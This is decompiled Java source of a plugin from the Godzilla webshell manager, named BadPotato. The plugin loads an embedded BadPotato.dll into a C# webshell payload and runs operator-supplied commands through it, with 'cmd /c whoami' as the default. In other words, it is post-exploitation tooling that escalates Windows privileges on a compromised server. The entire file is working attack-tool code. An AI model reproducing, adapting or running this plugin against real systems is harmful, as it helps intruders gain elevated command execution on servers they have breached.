/*     */ package shells.plugins.cshap;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.RTextArea;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ComponentAdapter;
/*     */ import java.awt.event.ComponentEvent;
/*     */ import java.io.InputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTextField;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "CShapDynamicPayload", Name = "BadPotato", DisplayName = "BadPotato")
/*     */ public class BadPotato
/*     */   implements Plugin
/*     */ {
/*     */   private static final String CLASS_NAME = "BadPotato.Run";
/*     */   private final JPanel panel;
/*     */   private final JButton loadButton;
/*     */   private final JButton runButton;
/*     */   private final JTextField commandTextField;
/*     */   private final JSplitPane splitPane;
/*     */   private final RTextArea resultTextArea;
/*     */   private boolean loadState;
/*     */   private ShellEntity shellEntity;
/*     */   private Payload payload;
/*     */   private Encoding encoding;
/*     */   
/*     */   public BadPotato() {
/*  44 */     this.panel = new JPanel(new BorderLayout());
/*  45 */     this.loadButton = new JButton("Load");
/*  46 */     this.runButton = new JButton("Run");
/*  47 */     this.commandTextField = new JTextField(35);
/*  48 */     this.resultTextArea = new RTextArea();
/*  49 */     this.splitPane = new JSplitPane();
/*     */     
/*  51 */     this.splitPane.setOrientation(0);
/*  52 */     this.splitPane.setDividerSize(0);
/*     */     
/*  54 */     JPanel topPanel = new JPanel();
/*     */     
/*  56 */     topPanel.add(this.loadButton);
/*  57 */     topPanel.add(this.commandTextField);
/*  58 */     topPanel.add(this.runButton);
/*     */     
/*  60 */     this.splitPane.setTopComponent(topPanel);
/*  61 */     this.splitPane.setBottomComponent(new JScrollPane((Component)this.resultTextArea));
/*     */     
/*  63 */     this.splitPane.addComponentListener(new ComponentAdapter()
/*     */         {
/*     */           public void componentResized(ComponentEvent e) {
/*  66 */             BadPotato.this.splitPane.setDividerLocation(0.15D);
/*     */           }
/*     */         });
/*     */     
/*  70 */     this.panel.add(this.splitPane);
/*     */     
/*  72 */     this.commandTextField.setText("cmd /c whoami");
/*     */   }
/*     */   
/*     */   private void loadButtonClick(ActionEvent actionEvent) {
/*  76 */     if (!this.loadState) {
/*     */       try {
/*  78 */         InputStream inputStream = getClass().getResourceAsStream("assets/BadPotato.dll");
/*  79 */         byte[] data = functions.readInputStream(inputStream);
/*  80 */         inputStream.close();
/*  81 */         if (this.payload.include("BadPotato.Run", data)) {
/*  82 */           this.loadState = true;
/*  83 */           GOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
/*     */         } else {
/*  85 */           GOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
/*     */         } 
/*  87 */       } catch (Exception e) {
/*  88 */         Log.error(e);
/*  89 */         GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
/*     */       } 
/*     */     } else {
/*     */       
/*  93 */       GOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
/*     */     } 
/*     */   }
/*     */   private void runButtonClick(ActionEvent actionEvent) {
/*  97 */     ReqParameter parameter = new ReqParameter();
/*  98 */     parameter.add("cmd", this.commandTextField.getText());
/*  99 */     byte[] result = this.payload.evalFunc("BadPotato.Run", "run", parameter);
/* 100 */     this.resultTextArea.setText(this.encoding.Decoding(result));
/*     */   }
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 105 */     this.shellEntity = shellEntity;
/* 106 */     this.payload = this.shellEntity.getPayloadModule();
/* 107 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 108 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 115 */     return this.panel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\cshap\BadPotato.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */